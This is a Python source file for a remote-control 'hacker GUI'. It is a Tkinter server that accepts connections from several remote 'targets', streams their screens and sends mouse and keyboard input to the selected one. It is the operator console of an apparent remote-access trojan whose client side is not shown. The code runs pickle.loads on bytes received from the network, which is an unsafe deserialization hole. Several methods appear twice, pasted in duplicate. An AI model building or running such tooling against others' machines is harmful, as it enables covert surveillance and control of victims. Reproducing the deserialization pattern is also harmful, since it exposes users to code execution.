"""
PROFESSIONAL MINIMALISTIC HACKER GUI
Beautiful, clean, with separate mouse/keyboard controls
FULL SCREEN screen sharing mode!
"""

import socket
import pickle
import cv2
import numpy as np
from datetime import datetime
import threading
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import time
import os

class ProfessionalHackerGUI:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.clients = {}
        self.current_client = None
        self.mouse_control = False
        self.keyboard_control = False
        self.fullscreen_mode = False

        # GUI
        self.root = None
        self.video_label = None
        self.control_frame = None
        self.mouse_btn = None
        self.keyboard_btn = None

        # Mouse tracking
        self.last_mouse_time = 0
        self.mouse_update_interval = 0.016  # 60 FPS
        self.is_dragging = False
        # Keep references to important UI containers so we can re-pack/lift them
        self.video_container = None
        self.status_bar = None
        self.fullscreen_exit_button = None
        self.dynamic_control_bar = None

    def start_gui(self):
        """Start the professional minimalistic GUI"""
        self.root = tk.Tk()
        self.root.title("Remote Control System")
        self.root.geometry("1600x900")
        self.root.configure(bg='#0f0f0f')

        # Style configuration
        style = ttk.Style()
        style.theme_use('clam')

        # MAIN VIDEO DISPLAY - Full window space for screen sharing
        self.video_container = tk.Frame(self.root, bg='#000000')
        self.video_container.pack(fill='both', expand=True, padx=0, pady=0)

        self.video_label = tk.Label(self.video_container, bg='#000000',
                                    text="NO CONNECTION\n\nSelect a target from the dropdown above",
                                    font=('Segoe UI', 18),
                                    fg='#333333',
                                    cursor='crosshair')
        self.video_label.pack(fill='both', expand=True)

        # Bind events
        self.video_label.bind('<Motion>', self.on_mouse_move)
        self.video_label.bind('<Button-1>', self.on_left_click)
        self.video_label.bind('<ButtonRelease-1>', self.on_left_release)
        self.video_label.bind('<Button-3>', self.on_right_click)
        self.video_label.bind('<B1-Motion>', self.on_drag_motion)
        self.root.bind('<Key>', self.on_key_press)
        # Bind ESC to exit fullscreen; exit_fullscreen accepts optional event
        self.root.bind('<Escape>', lambda e: self.exit_fullscreen())

        # Create dynamic island-style control bar
        self.create_dynamic_control_bar()

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Start status animation
        self.animate_status()
        # Ensure UI is drawn
        try:
            self.root.update_idletasks()
            self.root.update()
        except Exception:
            pass

    def create_dynamic_control_bar(self):
        """Create a dynamic island-style floating control bar"""
        # Create the dynamic bar as an overlay frame
        self.dynamic_control_bar = tk.Frame(self.root, bg='#1a1a1a', 
                                          relief='flat', bd=0)
        # Make it rounded-looking with padding
        self.dynamic_control_bar.configure(highlightbackground='#333333', 
                                         highlightthickness=1)
        
        # Position it at the top center, floating over content
        self.dynamic_control_bar.place(x=400, y=15, width=800, height=80)
        
        # Ensure it's always on top
        self.dynamic_control_bar.lift()
        
        # Inner container with padding for the "pill" effect
        inner_frame = tk.Frame(self.dynamic_control_bar, bg='#1a1a1a', padx=15, pady=10)
        inner_frame.pack(fill='both', expand=True)
        
        # Top row - Title, status, and info
        top_row = tk.Frame(inner_frame, bg='#1a1a1a')
        top_row.pack(fill='x', pady=(0, 5))
        
        # Left side - Title and status
        left_section = tk.Frame(top_row, bg='#1a1a1a')
        left_section.pack(side='left')
        
        title = tk.Label(left_section, text="⚡ REMOTE CONTROL",
                         font=('Segoe UI', 10, 'bold'),
                         bg='#1a1a1a', fg='#00ff88')
        title.pack(side='left')

        self.status_dot = tk.Label(left_section, text="●",
                                   font=('Arial', 12),
                                   bg='#1a1a1a', fg='#00ff88')
        self.status_dot.pack(side='left', padx=(8, 0))

        # Center - Target selector (compact)
        center_section = tk.Frame(top_row, bg='#1a1a1a')
        center_section.pack(side='left', padx=(20, 0))
        
        tk.Label(center_section, text="TARGET:",
                 font=('Segoe UI', 8, 'bold'),
                 bg='#1a1a1a', fg='#00ff88').pack(side='left', padx=(0, 5))

        self.target_var = tk.StringVar()
        self.target_combo = ttk.Combobox(center_section,
                                         textvariable=self.target_var,
                                         font=('Segoe UI', 8),
                                         width=20,
                                         state='readonly')
        self.target_combo.pack(side='left')
        self.target_combo.bind('<<ComboboxSelected>>', self.on_target_select)
        
        # Right side - Status info
        right_section = tk.Frame(top_row, bg='#1a1a1a')
        right_section.pack(side='right')
        
        # Display IP
        display_ip = self.get_display_ip()
        tk.Label(right_section, text=f"HOST: {display_ip}",
                font=('Segoe UI', 7),
                bg='#1a1a1a', fg='#888888').pack(side='left', padx=(0, 10))
        
        # Connection counter
        self.conn_label = tk.Label(right_section,
                                   text="0 Connections",
                                   font=('Segoe UI', 7),
                                   bg='#1a1a1a', fg='#666666')
        self.conn_label.pack(side='left')
        
        # Bottom row - Control buttons (compact and modern)
        bottom_row = tk.Frame(inner_frame, bg='#1a1a1a')
        bottom_row.pack(fill='x')

        # Left controls
        left_controls = tk.Frame(bottom_row, bg='#1a1a1a')
        left_controls.pack(side='left')

        # Mouse control button (round-ish)
        self.mouse_btn = tk.Button(left_controls, text="🖱",
                                   font=('Segoe UI', 10),
                                   bg='#2a2a2a', fg='#888888',
                                   activebackground='#00ff88',
                                   activeforeground='#000000',
                                   relief='flat',
                                   width=3, height=1,
                                   cursor='hand2',
                                   command=self.toggle_mouse)
        self.mouse_btn.pack(side='left', padx=2)

        # Keyboard control button
        self.keyboard_btn = tk.Button(left_controls, text="⌨",
                                      font=('Segoe UI', 10),
                                      bg='#2a2a2a', fg='#888888',
                                      activebackground='#00ff88',
                                      activeforeground='#000000',
                                      relief='flat',
                                      width=3, height=1,
                                      cursor='hand2',
                                      command=self.toggle_keyboard)
        self.keyboard_btn.pack(side='left', padx=2)

        # Fullscreen toggle
        self.fullscreen_btn = tk.Button(left_controls, text="⛶",
                     font=('Segoe UI', 10),
                     bg='#2a2a2a', fg='#888888',
                     activebackground='#00ccff',
                     activeforeground='#000000',
                     relief='flat',
                     width=3, height=1,
                     cursor='hand2',
                     command=self.toggle_fullscreen)
        self.fullscreen_btn.pack(side='left', padx=2)

        # Center - Status message
        center_controls = tk.Frame(bottom_row, bg='#1a1a1a')
        center_controls.pack(side='left', expand=True, padx=(20, 20))
        
        self.info_label = tk.Label(center_controls,
                                   text="Ready • Waiting for connections",
                                   font=('Segoe UI', 7),
                                   bg='#1a1a1a', fg='#666666')
        self.info_label.pack()

        # Right controls
        right_controls = tk.Frame(bottom_row, bg='#1a1a1a')
        right_controls.pack(side='right')

        # Hide bar button
        self.hide_btn = tk.Button(right_controls, text="▼",
                     font=('Segoe UI', 8),
                     bg='#2a2a2a', fg='#888888',
                     activebackground='#ffaa00',
                     activeforeground='#000000',
                     relief='flat',
                     width=2, height=1,
                     cursor='hand2',
                     command=self.toggle_bar_visibility)
        self.hide_btn.pack(side='left', padx=(0, 5))

        # Disconnect button
        tk.Button(right_controls, text="✕",
                 font=('Segoe UI', 9, 'bold'),
                 bg='#2a2a2a', fg='#ff4444',
                 activebackground='#ff0000',
                 activeforeground='#ffffff',
                 relief='flat',
                 width=2, height=1,
                 cursor='hand2',
                 command=self.stop_server).pack(side='left')

    def toggle_bar_visibility(self):
        """Toggle dynamic bar visibility"""
        try:
            if self.dynamic_control_bar.winfo_viewable():
                self.dynamic_control_bar.place_forget()
                # Create a minimal show button
                self.show_btn = tk.Button(self.root, text="▲",
                         font=('Segoe UI', 8),
                         bg='#2a2a2a', fg='#888888',
                         activebackground='#ffaa00',
                         activeforeground='#000000',
                         relief='flat',
                         width=2, height=1,
                         cursor='hand2',
                         command=self.show_bar)
                self.show_btn.place(x=780, y=15)
                self.show_btn.lift()
            else:
                self.show_bar()
        except Exception:
            pass
    
    def show_bar(self):
        """Show the dynamic bar"""
        try:
            if hasattr(self, 'show_btn'):
                self.show_btn.destroy()
            self.dynamic_control_bar.place(x=400, y=15, width=800, height=80)
            self.dynamic_control_bar.lift()
        except Exception:
            pass

    def animate_status(self):
        """Animate status indicator"""
        if self.running and self.status_dot:
            current = self.status_dot.cget('fg')
            new_color = '#00ff88' if current == '#003322' else '#003322'
            self.status_dot.config(fg=new_color)
            self.root.after(800, self.animate_status)

    def toggle_mouse(self):
        """Toggle mouse control"""
        self.mouse_control = not self.mouse_control
        if self.mouse_control:
            self.mouse_btn.config(bg='#00ff88', fg='#000000')
            self.update_info("Mouse control enabled • Move cursor to control target")
        else:
            self.mouse_btn.config(bg='#2a2a2a', fg='#888888')
            self.update_info("Mouse control disabled")

    def toggle_keyboard(self):
        """Toggle keyboard control"""
        self.keyboard_control = not self.keyboard_control
        if self.keyboard_control:
            self.keyboard_btn.config(bg='#00ff88', fg='#000000')
            self.update_info("Keyboard control enabled • Type to control target")
        else:
            self.keyboard_btn.config(bg='#2a2a2a', fg='#888888')
            self.update_info("Keyboard control disabled")

    def toggle_fullscreen(self):
        """Toggle fullscreen mode"""
        self.fullscreen_mode = not self.fullscreen_mode
        if self.fullscreen_mode:
            try:
                self.root.attributes('-fullscreen', True)
                self.fullscreen_btn.config(bg='#00ccff', fg='#000000')
                # Ensure dynamic bar stays on top in fullscreen
                self.dynamic_control_bar.lift()
            except Exception:
                pass
            self.update_info("FULLSCREEN MODE • Press ESC to exit")
        else:
            self.exit_fullscreen()

    def exit_fullscreen(self):
        """Exit fullscreen mode"""
        self.fullscreen_mode = False
        try:
            self.root.attributes('-fullscreen', False)
            self.root.geometry("1600x900")
            self.fullscreen_btn.config(bg='#2a2a2a', fg='#888888')
            # Ensure dynamic bar stays on top after fullscreen
            self.dynamic_control_bar.lift()
        except Exception:
            pass
        self.update_info("Exited fullscreen mode")

    def on_target_select(self, event):
        """Target selected from dropdown"""
        target_text = self.target_var.get()
        if target_text and target_text != "No targets available":
            # Extract IP from text
            ip = target_text.split(' ')[0]
            for addr in self.clients.keys():
                if addr[0] == ip:
                    self.current_client = addr
                    self.update_info(f"Connected to {addr[0]} • Ready for control")
                    break

    def on_mouse_move(self, event):
        """ULTRA FAST mouse movement"""
        if not self.mouse_control or not self.current_client:
            return
        current_time = time.time()
        if current_time - self.last_mouse_time < self.mouse_update_interval:
            return
        self.last_mouse_time = current_time
        x = event.x
        y = event.y
        label_width = self.video_label.winfo_width()
        label_height = self.video_label.winfo_height()
        norm_x = max(0, min(1, x / label_width)) if label_width > 0 else 0
        norm_y = max(0, min(1, y / label_height)) if label_height > 0 else 0
        self.send_command(self.current_client, 'MOUSE_MOVE', {'norm_x': norm_x, 'norm_y': norm_y})

    def on_left_click(self, event):
        """Left click - start drag"""
        if not self.mouse_control or not self.current_client:
            return
        x = event.x
        y = event.y
        label_width = self.video_label.winfo_width()
        label_height = self.video_label.winfo_height()
        norm_x = max(0, min(1, x / label_width)) if label_width > 0 else 0
        norm_y = max(0, min(1, y / label_height)) if label_height > 0 else 0
        self.is_dragging = True
        self.send_command(self.current_client, 'MOUSE_DOWN', {'button': 'left', 'norm_x': norm_x, 'norm_y': norm_y})

    def on_left_release(self, event):
        """Left release - end drag"""
        if not self.mouse_control or not self.current_client:
            return
        x = event.x
        y = event.y
        label_width = self.video_label.winfo_width()
        label_height = self.video_label.winfo_height()
        norm_x = max(0, min(1, x / label_width)) if label_width > 0 else 0
        norm_y = max(0, min(1, y / label_height)) if label_height > 0 else 0
        self.is_dragging = False
        self.send_command(self.current_client, 'MOUSE_UP', {'button': 'left', 'norm_x': norm_x, 'norm_y': norm_y})

    def on_drag_motion(self, event):
        """Mouse drag motion - for dragging files"""
        if not self.mouse_control or not self.current_client or not self.is_dragging:
            return
        x = event.x
        y = event.y
        label_width = self.video_label.winfo_width()
        label_height = self.video_label.winfo_height()
        norm_x = max(0, min(1, x / label_width)) if label_width > 0 else 0
        norm_y = max(0, min(1, y / label_height)) if label_height > 0 else 0
        self.send_command(self.current_client, 'MOUSE_DRAG', {'norm_x': norm_x, 'norm_y': norm_y})

    def on_right_click(self, event):
        """Right click"""
        if not self.mouse_control or not self.current_client:
            return
        x = event.x
        y = event.y
        label_width = self.video_label.winfo_width()
        label_height = self.video_label.winfo_height()
        norm_x = max(0, min(1, x / label_width)) if label_width > 0 else 0
        norm_y = max(0, min(1, y / label_height)) if label_height > 0 else 0
        self.send_command(self.current_client, 'MOUSE_CLICK', {'button': 'right', 'norm_x': norm_x, 'norm_y': norm_y})

    def on_key_press(self, event):
        """Keyboard input"""
        if not self.keyboard_control or not self.current_client:
            return
        key = event.char
        if key:
            self.send_command(self.current_client, 'KEY_CHAR', key)

    def send_command(self, address, cmd_type, data):
        """Send control command"""
        try:
            if address in self.clients:
                command = {'type': cmd_type, 'data': data}
                cmd_data = pickle.dumps(command)
                size = len(cmd_data)
                self.clients[address]['socket'].sendall(f"CMD:{size:<16}".encode())
                self.clients[address]['socket'].sendall(cmd_data)
        except Exception:
            pass

    def update_info(self, message):
        """Update status bar"""
        if self.info_label:
            self.info_label.config(text=message)

    def update_target_list(self):
        """Update target dropdown"""
        targets = []
        for addr in self.clients.keys():
            targets.append(f"{addr[0]} • Online")
        if targets:
            self.target_combo['values'] = targets
            if not self.target_var.get():
                self.target_combo.current(0)
                self.on_target_select(None)
        else:
            self.target_combo['values'] = ["No targets available"]
            self.target_var.set("No targets available")
        count = len(self.clients)
        self.conn_label.config(text=f"{count} Connection{'s' if count != 1 else ''}")

    def update_video_frame(self, frame):
        """Update video - MAXIMUM SIZE"""
        if self.video_label and frame is not None:
            label_width = self.video_label.winfo_width()
            label_height = self.video_label.winfo_height()
            if label_width > 1 and label_height > 1:
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                h, w = frame_rgb.shape[:2]
                status_text = ""
                status_color = (100, 100, 100)
                if self.mouse_control and self.keyboard_control:
                    status_text = "FULL CONTROL"
                    status_color = (0, 255, 136)
                elif self.mouse_control:
                    status_text = "MOUSE ON"
                    status_color = (0, 255, 136)
                elif self.keyboard_control:
                    status_text = "KEYBOARD ON"
                    status_color = (0, 255, 136)
                else:
                    status_text = "VIEW ONLY"
                    status_color = (136, 136, 136)
                text_size = cv2.getTextSize(status_text, cv2.FONT_HERSHEY_SIMPLEX, 0.5, 1)[0]
                badge_w = text_size[0] + 20
                badge_h = 30
                overlay = frame_rgb.copy()
                cv2.rectangle(overlay, (w - badge_w - 10, 10), (w - 10, 10 + badge_h), (20, 20, 20), -1)
                frame_rgb = cv2.addWeighted(overlay, 0.7, frame_rgb, 0.3, 0)
                cv2.putText(frame_rgb, status_text, (w - badge_w, 30), cv2.FONT_HERSHEY_SIMPLEX, 0.5, status_color, 1, cv2.LINE_AA)
                frame_resized = cv2.resize(frame_rgb, (label_width, label_height))
                img = Image.fromarray(frame_resized)
                photo = ImageTk.PhotoImage(image=img)
                self.video_label.config(image=photo, text="")
                self.video_label.image = photo

    def video_update_loop(self):
        """Video update loop"""
        while self.running:
            if self.current_client and self.current_client in self.clients:
                client_data = self.clients[self.current_client]
                if 'current_frame' in client_data:
                    frame = client_data['current_frame']
                    if self.root:
                        self.root.after(0, self.update_video_frame, frame)
            time.sleep(0.033)

    def start(self):
        """Start server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            threading.Thread(target=self.accept_connections, daemon=True).start()
            threading.Thread(target=self.video_update_loop, daemon=True).start()
            self.start_gui()
            self.root.mainloop()
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.stop()

    def accept_connections(self):
        """Accept connections"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                self.clients[address] = {'socket': client_socket}
                if self.root:
                    self.root.after(0, self.update_target_list)
                    self.root.after(0, self.update_info, f"New connection • {address[0]}")
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, address), daemon=True)
                client_thread.start()
                self.clients[address]['thread'] = client_thread
            except socket.timeout:
                continue
            except OSError:
                break
            except Exception as e:
                if self.running:
                    print(f"Error: {e}")

    def handle_client(self, client_socket, address):
        """Handle client"""
        try:
            while self.running and address in self.clients:
                data_size = client_socket.recv(16)
                if not data_size:
                    break
                msg_size = int(data_size.decode().strip())
                data = b''
                while len(data) < msg_size:
                    packet = client_socket.recv(min(4096, msg_size - len(data)))
                    if not packet:
                        break
                    data += packet
                if len(data) < msg_size:
                    break
                frame_data = pickle.loads(data)
                frame = cv2.imdecode(np.frombuffer(frame_data, np.uint8), cv2.IMREAD_COLOR)
                self.clients[address]['current_frame'] = frame
        except Exception:
            pass
        finally:
            self.disconnect_client(address)

    def disconnect_client(self, address):
        """Disconnect client"""
        if address in self.clients:
            try:
                self.clients[address]['socket'].close()
            except:
                pass
            del self.clients[address]
            if self.current_client == address:
                self.current_client = None
                if self.video_label:
                    self.video_label.config(image='', text="CONNECTION LOST\n\nSelect another target")
            if self.root:
                self.root.after(0, self.update_target_list)
                self.root.after(0, self.update_info, f"Disconnected • {address[0]}")

    def stop_server(self):
        """Stop server"""
        self.running = False
        if self.root:
            self.root.quit()

    def on_closing(self):
        """Handle close"""
        self.stop_server()

    def stop(self):
        """Cleanup"""
        self.running = False
        for addr in list(self.clients.keys()):
            self.disconnect_client(addr)
        if self.server_socket:
            self.server_socket.close()

    def get_local_ip(self):
        """Get local IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "N/A"

    def get_display_ip(self):
        """Return IP to display in the GUI: prefer LAST_IP.txt, else local IP."""
        try:
            path = os.path.join(os.path.dirname(__file__), "LAST_IP.txt")
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8') as f:
                    ip = f.read().strip()
                    if ip:
                        return ip
        except Exception:
            pass
        return self.get_local_ip()
    def update_target_list(self):
        """Update target dropdown"""
        targets = []
        for addr in self.clients.keys():
            targets.append(f"{addr[0]} • Online")
        
        if targets:
            self.target_combo['values'] = targets
            if not self.target_var.get():
                self.target_combo.current(0)
                self.on_target_select(None)
        else:
            self.target_combo['values'] = ["No targets available"]
            self.target_var.set("No targets available")
        
        # Update connection counter
        count = len(self.clients)
        self.conn_label.config(text=f"{count} Connection{'s' if count != 1 else ''}")
    
    def update_video_frame(self, frame):
        """Update video - MAXIMUM SIZE"""
        if self.video_label and frame is not None:
            label_width = self.video_label.winfo_width()
            label_height = self.video_label.winfo_height()
            
            if label_width > 1 and label_height > 1:
                frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                
                # Minimal overlay - top right corner only
                h, w = frame_rgb.shape[:2]
                
                # Small status indicator
                status_text = ""
                status_color = (100, 100, 100)
                
                if self.mouse_control and self.keyboard_control:
                    status_text = "FULL CONTROL"
                    status_color = (0, 255, 136)
                elif self.mouse_control:
                    status_text = "MOUSE ON"
                    status_color = (0, 255, 136)
                elif self.keyboard_control:
                    status_text = "KEYBOARD ON"
                    status_color = (0, 255, 136)
                else:
                    status_text = "VIEW ONLY"
                    status_color = (136, 136, 136)
                
                # Small badge in top-right corner
                text_size = cv2.getTextSize(status_text, cv2.FONT_HERSHEY_SIMPLEX, 0.5, 1)[0]
                badge_w = text_size[0] + 20
                badge_h = 30
                
                # Semi-transparent background
                overlay = frame_rgb.copy()
                cv2.rectangle(overlay, (w - badge_w - 10, 10), (w - 10, 10 + badge_h), 
                            (20, 20, 20), -1)
                frame_rgb = cv2.addWeighted(overlay, 0.7, frame_rgb, 0.3, 0)
                
                # Status text
                cv2.putText(frame_rgb, status_text, 
                           (w - badge_w, 30),
                           cv2.FONT_HERSHEY_SIMPLEX, 0.5, status_color, 1, cv2.LINE_AA)
                
                # Resize to fit - maintain aspect ratio
                frame_resized = cv2.resize(frame_rgb, (label_width, label_height))
                
                img = Image.fromarray(frame_resized)
                photo = ImageTk.PhotoImage(image=img)
                
                self.video_label.config(image=photo, text="")
                self.video_label.image = photo
    
    def video_update_loop(self):
        """Video update loop"""
        while self.running:
            if self.current_client and self.current_client in self.clients:
                client_data = self.clients[self.current_client]
                if 'current_frame' in client_data:
                    frame = client_data['current_frame']
                    if self.root:
                        self.root.after(0, self.update_video_frame, frame)
            time.sleep(0.033)  # ~30 FPS
    
    def start(self):
        """Start server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            threading.Thread(target=self.accept_connections, daemon=True).start()
            threading.Thread(target=self.video_update_loop, daemon=True).start()
            
            self.start_gui()
            self.root.mainloop()
            
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.stop()
    
    def accept_connections(self):
        """Accept connections"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                
                self.clients[address] = {'socket': client_socket}
                
                if self.root:
                    self.root.after(0, self.update_target_list)
                    self.root.after(0, self.update_info, 
                                   f"New connection • {address[0]}")
                
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_thread.start()
                self.clients[address]['thread'] = client_thread
                
            except socket.timeout:
                continue
            except OSError:
                break
            except Exception as e:
                if self.running:
                    print(f"Error: {e}")
    
    def handle_client(self, client_socket, address):
        """Handle client"""
        try:
            while self.running and address in self.clients:
                data_size = client_socket.recv(16)
                if not data_size:
                    break
                
                msg_size = int(data_size.decode().strip())
                
                data = b''
                while len(data) < msg_size:
                    packet = client_socket.recv(min(4096, msg_size - len(data)))
                    if not packet:
                        break
                    data += packet
                
                if len(data) < msg_size:
                    break
                
                frame_data = pickle.loads(data)
                frame = cv2.imdecode(np.frombuffer(frame_data, np.uint8), cv2.IMREAD_COLOR)
                
                self.clients[address]['current_frame'] = frame
                
        except Exception as e:
            pass
        finally:
            self.disconnect_client(address)
    
    def disconnect_client(self, address):
        """Disconnect client"""
        if address in self.clients:
            try:
                self.clients[address]['socket'].close()
            except:
                pass
            del self.clients[address]
            
            if self.current_client == address:
                self.current_client = None
                if self.video_label:
                    self.video_label.config(image='',
                                           text="CONNECTION LOST\n\nSelect another target")
            
            if self.root:
                self.root.after(0, self.update_target_list)
                self.root.after(0, self.update_info,
                               f"Disconnected • {address[0]}")
    
    def stop_server(self):
        """Stop server"""
        self.running = False
        if self.root:
            self.root.quit()
    
    def on_closing(self):
        """Handle close"""
        self.stop_server()
    
    def stop(self):
        """Cleanup"""
        self.running = False
        for addr in list(self.clients.keys()):
            self.disconnect_client(addr)
        if self.server_socket:
            self.server_socket.close()
    
    def get_local_ip(self):
        """Get local IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "N/A"

    def get_display_ip(self):
        """Return IP to display in the GUI: prefer LAST_IP.txt, else local IP."""
        try:
            path = os.path.join(os.path.dirname(__file__), "LAST_IP.txt")
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8') as f:
                    ip = f.read().strip()
                    if ip:
                        return ip
        except Exception:
            pass
        return self.get_local_ip()

if __name__ == "__main__":
    print("\n" + "=" * 70)
    print("PROFESSIONAL REMOTE CONTROL - LAUNCHING...")
    print("=" * 70)
    
    try:
        server = ProfessionalHackerGUI(host='0.0.0.0', port=5555)
        server.start()
    except KeyboardInterrupt:
        print("\n\nServer stopped")
    except Exception as e:
        print(f"\nError: {e}")
